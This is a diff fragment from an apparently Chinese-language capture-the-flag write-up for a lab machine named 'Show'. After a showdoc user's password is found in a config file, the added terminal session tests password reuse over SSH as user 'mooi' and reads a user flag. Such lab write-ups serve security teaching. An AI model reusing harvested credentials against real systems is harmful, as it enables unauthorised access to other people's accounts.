@@ -177,3 +177,27 @@ return array(
 );
 ```
 直接发现了showdoc用户的密码。我们尝试一下，看是否存在密码复用
+```bash
+┌──(kali㉿kali)-[~/桌面]
+└─$ ssh mooi@10.241.108.8  
+The authenticity of host '10.241.108.8 (10.241.108.8)' can't be established.
+ED25519 key fingerprint is SHA256:MjoUe5ON03T2UcSPmlU3evmpGUywqf/3IUm0+1p77cI.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.241.108.8' (ED25519) to the list of known hosts.
+mooi@10.241.108.8's password: 
+Linux Show 6.12.73+deb13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.73-1 (2026-02-17) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Apr 25 07:14:32 2026 from 192.168.193.14
+mooi@Show:~$ ls
+user.txt
+mooi@Show:~$ cat user.txt 
+flag{user-f5ce64ad520f46e2bcb1dc94dbb6dbd3}
+
+```
